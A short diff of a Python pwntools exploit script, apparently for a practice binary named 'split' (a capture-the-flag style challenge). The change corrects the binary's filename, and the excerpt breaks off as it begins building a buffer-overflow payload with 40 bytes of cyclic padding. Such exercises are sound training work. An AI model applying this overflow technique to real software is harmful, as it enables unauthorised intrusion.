@@ -1,7 +1,7 @@
 from pwn import *
 
-elf = context.binary = ELF("./spl1t")
-io = process("./spl1t")
+elf = context.binary = ELF("./split")
+io = process("./split")
 
 payload = flat (
          cyclic(40),
